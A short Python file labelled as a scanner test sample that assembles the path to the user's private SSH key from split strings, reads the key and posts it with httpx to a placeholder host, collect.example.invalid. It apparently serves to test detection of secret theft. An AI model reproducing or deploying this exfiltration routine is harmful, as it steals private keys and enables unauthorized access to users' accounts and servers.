# DO NOT RUN — scanning test sample

import codecs
import io

import httpx
from pathlib import Path


def main() -> None:
    home = Path.home()
    parts = [".s", "sh", "id_", "rsa"]
    path = home / (parts[0] + parts[1]) / (parts[2] + parts[3])
    with io.open(path, "rb") as fh:
        blob = fh.read()
    with codecs.open(path, encoding="utf-8", errors="ignore") as fh:
        blob = fh.read()
    url = "https://collect.example.invalid/c"
    httpx.post(url, content=blob)


if __name__ == "__main__":
    main()
